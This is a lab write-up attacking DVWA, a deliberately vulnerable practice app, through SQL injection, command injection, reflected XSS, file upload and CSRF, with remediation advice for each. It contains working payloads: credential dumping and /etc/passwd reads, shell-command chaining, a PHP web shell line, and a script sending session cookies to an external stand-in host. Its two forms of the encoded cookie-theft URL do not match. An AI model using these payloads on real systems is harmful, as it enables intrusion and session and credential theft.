# DVWA (Damn Vulnerable Web Application) — Security Lab Report

## 1. SQL Injection

### Low Security Level

The target interface expects user input and may or may not return information. When providing a valid ID (an integer between `1` and `5`), the application returns details about the corresponding user. For example, entering `1` returns:

```text
ID: 1
First name: admin
Surname: admin
```

Testing other inputs shows that letters or numbers exceeding existing IDs produce no output and no visible error. However, certain special characters trigger an error page (which would have been wiser to keep server-side) containing:

```text
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'test2'' at line 1
```

The single quote (`'`) triggers an error (the second trailing quote in `'test2''` is added by MySQL's error message formatter around the offending token). This indicates that the input is directly embedded inside single quotes in an unsanitized SQL query, which is confirmed by clicking **View Source**:

```php
$id = $_GET['id'];
$getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
```

To perform a SQL injection and dump all records from the table, we can enter any character, close the `user_id` string literal with `'`, inject a condition that always evaluates to true, and comment out the rest of the query using `-- ` (note the mandatory trailing space in MySQL):

```sql
t' or 1=1; -- 
```

The resulting SQL query becomes:
```sql
SELECT first_name, last_name FROM users WHERE user_id = 't' or 1=1; -- '
```

This returns all users in the table (`admin`, `Gordon Brown`, `Hack Me`, `Pablo Picasso`, `Bob Smith`). Using `t' or user_id < 9; -- ` produces the exact same output.

#### Database Enumeration
To retrieve the SQL version using `SELECT @@version`, a naive `UNION` injection (`' UNION SELECT @@version; -- `) fails with:

```text
The used SELECT statements have a different number of columns
```

Because the original query selects two columns (`first_name`, `last_name`), we pad our `UNION` query with `NULL` to match the column count:

```sql
' UNION SELECT @@version, NULL; -- 
```

This returns `5.1.41`. Repeating the same method allows extracting additional system information:
* `current_user()` → `root@localhost`
* `database()` → `dvwa`
* `@@datadir` → `/opt/lampp/var/mysql/`

We can also query the `mysql.user` table to dump database accounts and passwords:

```sql
1' UNION SELECT concat(user,0x3a,password), null from mysql.user; -- 
```

Output:
```text
First name: admin / Surname: admin
First name: root:
First name: :
First name: pma:
```

Finally, we can read local system files such as `/etc/passwd` (or `/etc/shadow`) using `load_file()`:

```sql
1' UNION SELECT load_file('/etc/passwd'), null from mysql.user; -- 
```

Output:
```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
dvwa:x:1000:1000:dvwa,,,:/home/dvwa:/bin/bash
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
messagebus:x:103:110::/var/run/dbus:/bin/false
usbmux:x:104:46:usbmux daemon,,,:/home/usbmux:/bin/false
pulse:x:105:111:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:106:113:RealtimeKit,,,:/proc:/bin/false
```

### Medium Security Level
The PHP backend applies `mysql_real_escape_string` to the input before inserting it into the query, but no longer wraps the ID in single quotes (`WHERE user_id = $id`). As a result, we can directly inject `9 UNION SELECT @@version, NULL` or `9 or 1=1` without quotes to retrieve the same information.

### Remediation
* Use **parameterized queries (prepared statements)** via `PDO` or `mysqli` so user input is strictly bound as data rather than interpreted as SQL syntax.
* Disable verbose SQL error output in production (`display_errors = Off`).
* Apply the principle of least privilege so the database user does not run as `root` or possess `FILE` privileges (`load_file()`).

---

## 2. Command Execution

### Low Security Level

This page provides an input field that pings the supplied IP address. Submitting `127.0.0.1` returns:

```text
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.014 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.024 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.035 ms
--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2001ms
rtt min/avg/max/mdev = 0.014/0.024/0.035/0.009 ms
```

Inspecting the source code shows that:
* User inputs are not sanitized.
* Because 3 ICMP packets are sent by default, the remote machine is not running Windows, but a POSIX-like operating system.

We can chain shell commands using `&&`:

```bash
127.0.0.1 && ls
```

Output:
```text
help
index.php
source
```

Note that `&&` only executes the second command if the first succeeds; using `127.0.0.1` guarantees the ping succeeds even though the lab machine has no internet access. Additionally, each request spawns a new subshell without state persistence (running `cd` followed by `pwd` in a separate request resets the working directory to `/opt/lampp/htdocs/vulnerabilities/exec`).

Running `127.0.0.1 && ifconfig` enumerates the network interfaces:

```text
eth0      Link encap:Ethernet  HWaddr 08:00:27:8d:20:52  
          inet addr:192.168.56.101  Bcast:192.168.56.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fe8d:2052/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:917 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1031 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:174780 (174.7 KB)  TX bytes:629259 (629.2 KB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:140 errors:0 dropped:0 overruns:0 frame:0
          TX packets:140 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:11188 (11.1 KB)  TX bytes:11188 (11.1 KB)
```

Overall, this gives full access to the machine (creating files, modifying permissions, running a compiled binary in the background, etc.).

### Medium Security Level
The `&&` and `;` command separators are blacklisted. However, we can still pipe (`|`) the output of `ping` into another command (`127.0.0.1 | ls`) to achieve the same result.

### Remediation
* Validate input strictly against an IP allowlist using `filter_var($ip, FILTER_VALIDATE_IP)`.
* Escape shell arguments with `escapeshellarg()` before passing them to system execution functions.

---

## 3. Reflected XSS

### Low Security Level

The page prompts for a first name and reflects it back as `Hello <name>`. Testing `<` and `>` confirms that special HTML characters are not sanitized or HTML-entity encoded before rendering.

Injecting a basic `<script>` payload triggers a browser alert:

```html
<script>alert("hallo");</script>
```

![XSS Alert](assets/xss-alert.png)

Using `console.log` to print `document.cookie` outputs the session cookie in the developer console (`F12`):

```text
PHPSESSID=r86r7njmncshnc86neeo29r382; security=low
```

We can also inject an `<iframe>` element to embed DVWA inside itself, a sort of DVWA-ception:

![XSS Iframe](assets/xss-iframe.png)

#### Session Cookie Exfiltration
Because the parameter is passed in the URL (`http://192.168.56.101/vulnerabilities/xss_r/?name=...#`), we can craft a link containing an `<img>` tag that sends the victim's `document.cookie` via a GET request to an external server:

```html
<script>document.write("<img src='http://my-cookie-stealing-site.com/i-love-cookies/?var=" + escape(document.cookie) + "' width='0' height='0'>");</script>
```

Final URL:
```text
[http://192.168.56.101/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.write%28%22%3Cimg+src%3D%27http%3A%2F%2Fmy-cookie-stealing-site.com%2i-love-cookies%2F%3Fvar%3D%22+%2B+escape%28document.cookie%29+%2B+%22%27+width%3D%270%27+height%3D%270%27%3E%22%29%3B%3C%2Fscript%3E#](http://192.168.56.101/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.write%28%22%3Cimg+src%3D%27http%3A%2F%2Fmonsite-voleur-de-cookie.com%2Fmiam-les-cookies%2F%3Fvar%3D%22+%2B+escape%28document.cookie%29+%2B+%22%27+width%3D%270%27+height%3D%270%27%3E%22%29%3B%3C%2Fscript%3E#)
```

![XSS Cookie Exfiltration](assets/xss-cookie-theft.png)

Replacing the dummy domain with the DVWA server IP and inspecting Apache logs via command injection (`127.0.0.1 && cat /opt/lampp/logs/access_log`) confirms that the cookie was sent to the server:

```text
192.168.56.1 - - [09/Nov/2026:09:55:41 +0000] "GET /script/?var=PHPSESSID%3Dr86r7njmncshnc86neeo29r382%3B%20security%3Dlow HTTP/1.1" 404 1951
```

### Medium Security Level
We can bypass the filter by writing `<SCRIPT>` in uppercase because the PHP check (`str_replace('<script>', '', $name)`) is case-sensitive. Even if `<script>` tags are stripped, nesting tags such as `<scr<script>ipt>` bypasses single-pass removal and still executes the JavaScript payload.

### Remediation
* Sanitize all reflected user input with `htmlspecialchars($name, ENT_QUOTES, 'UTF-8')`.
* Set the **`HttpOnly`** flag on session cookies (`PHPSESSID`) so JavaScript cannot read them via `document.cookie`, and enforce a strict Content Security Policy (`CSP`).

---

## 4. File Upload

### Low Security Level

The upload interface performs no checks on file extension, size, or content—only whether PHP can write the file to the server filesystem. Submitting a file displays its relative path:

```text
../../hackable/uploads/2018 6TiSCH.pdf successfully uploaded!
```

Navigating to `../../hackable/uploads` exposes the directory listing, allowing access to files uploaded by other users:

![Exposed Uploads Directory](assets/upload-directory-listing.png)

> **Further Security Impact (RCE):** Beyond unauthorized access to uploaded files via directory listing, the absence of server-side file validation allows an attacker to upload a malicious PHP web shell (e.g., `<?php system($_GET['cmd']); ?>`) and achieve Remote Code Execution (RCE) by requesting `/hackable/uploads/shell.php?cmd=id`.

### Medium Security Level
The directory listing remains accessible; only file size and the client-supplied `Content-Type` (`image/jpeg` or `image/png`) are checked. Uploading a small file named `mostDefinitelyAnImage.jpeg` still exposes the upload directory path (and can be bypassed for PHP execution by intercepting the request with a proxy like Burp Suite and spoofing the `Content-Type` header to `image/jpeg`).

### Remediation
* Disable Apache directory indexing (`Options -Indexes`) and return only the filename rather than its relative server path.
* Validate file extensions against a strict server-side allowlist, inspect actual file signatures (magic bytes) rather than trusting the `Content-Type` header, and disable PHP script execution inside the `uploads/` folder.

---

## 5. CSRF

### Low Security Level

The admin password reset page sends parameters in cleartext via a `GET` request without requiring the current password or an anti-CSRF token:

```text
[http://192.168.56.101/vulnerabilities/csrf/?password_new=toto&password_conf=toto&Change=Change#](http://192.168.56.101/vulnerabilities/csrf/?password_new=toto&password_conf=toto&Change=Change#)
```

While the endpoint verifies that the requester holds an active session cookie (`PHPSESSID`), browsers automatically attach session cookies to cross-origin requests. As a result, if an already-authenticated administrator clicks a crafted link or visits a malicious page embedding this URL (e.g., in an `<img>` or `<iframe>` tag), the password is silently changed to `toto` without their consent.

### Medium Security Level
In `Medium` mode, the backend verifies that the HTTP **`Referer`** header contains the server's hostname (`stripos($_SERVER['HTTP_REFERER'],$_SERVER['SERVER_NAME']) !== false`) before applying the password change. This check can be bypassed by:
* Intercepting the request (e.g., via Burp Suite) or using `curl -e "http://192.168.56.101/vulnerabilities/csrf/"` to spoof the `Referer` header.
* Chaining the Reflected XSS vulnerability on the same domain so the forged password-change request originates legitimately from `192.168.56.101`.

### Remediation
* Generate a unique, unpredictable **anti-CSRF token** bound to the user's session and validate it on every state-changing request.
* Require the user's **current password** before updating credentials, switch the form to `POST`, and set `SameSite=Strict` (or `Lax`) on session cookies.
